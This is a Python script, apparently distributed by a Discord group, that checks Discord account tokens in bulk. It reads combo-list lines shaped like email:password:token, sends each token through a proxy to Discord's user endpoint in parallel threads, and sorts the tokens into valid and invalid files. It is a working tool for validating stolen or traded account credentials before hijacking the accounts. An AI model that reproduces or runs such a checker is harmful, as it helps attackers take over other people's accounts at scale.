import requests
import threading
import colorama
from colorama import Style, Fore
import time

valid_count = 0
invalid_count = 0

colors = {
    'red': Fore.RED,
    'magenta': Fore.MAGENTA,
    'yellow': Fore.YELLOW,
    'green': Fore.GREEN,
    'blue': Fore.BLUE,
    'dim': Style.DIM,
    'bright': Style.BRIGHT,
    'reset': Style.RESET_ALL
}

def check_token(token, valid_tokens, invalid_tokens):
    global valid_count, invalid_count

    spoofed_token = token[:35] + "*" * 5
    headers = {'Authorization': token}
    url = 'https://discord.com/api/v9/users/@me'
    proxy = {"http": "http://user:password:ip:port"}

    try:
        response = requests.get(url, headers=headers, proxies=proxy)
        if response.status_code == 200:
            print(f"{colors['magenta']}[{colors['yellow']}+{colors['magenta']}]{colors['reset']} {spoofed_token} {colors['green']}[VALID]{colors['reset']}")
            valid_count += 1
            valid_tokens.append(token)
        else:
            print(f"{colors['magenta']}[{colors['yellow']}-{colors['magenta']}]{colors['reset']} {spoofed_token} {colors['red']}[INVALID]{colors['reset']}")
            invalid_count += 1
            invalid_tokens.append(token)
    except Exception:
        print(f"{colors['magenta']}[{colors['yellow']}-{colors['magenta']}]{colors['reset']} {spoofed_token} {colors['red']}[INVALID]{colors['reset']}")
        invalid_count += 1
        invalid_tokens.append(token)

def token_checker():

    print(f'''{colors['magenta']}
_______________________     _________                  .__                     
\_   _____/_   \_____  \   /   _____/ ______________  _|__| ____  ____   ______
 |    __)_ |   | _(__  <   \_____  \_/ __ \_  __ \  \/ /  |/ ___\/ __ \ /  ___/
 |        \|   |/       \  /        \  ___/|  | \/\   /|  \  \__\  ___/ \___ \ 
/_______  /|___/______  / /_______  /\___  >__|    \_/ |__|\___  >___  >____  >
        \/            \/          \/     \/                    \/    \/     \/ 
               {colors['blue']} Free Simple Token Checker ~ discord.gg/E13{colors['reset']}
          ''')
    valid_tokens = []
    invalid_tokens = []

    try:
        with open('data/unchecked.txt', 'r') as file:
            tokens = [line.split(':')[2] for line in file.read().splitlines()]
    except FileNotFoundError:
        print("File 'data/unchecked.txt' not found.")
        return

    threads = [threading.Thread(target=check_token, args=(token, valid_tokens, invalid_tokens)) for token in tokens]

    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

    with open('output/valid.txt', 'w') as valid_file:
        valid_file.write('\n'.join(valid_tokens))

    with open('output/invalid.txt', 'w') as invalid_file:
        invalid_file.write('\n'.join(invalid_tokens))

    print(f"{colors['reset']}Token Stats{colors['magenta']}: {colors['bright']}{colors['red']}INVALID {colors['reset']}{colors['red']}{invalid_count}  {colors['bright']}{colors['green']}VALID {colors['reset']}{colors['green']}{valid_count}{colors['reset']}")
    time.sleep(2)


token_checker()
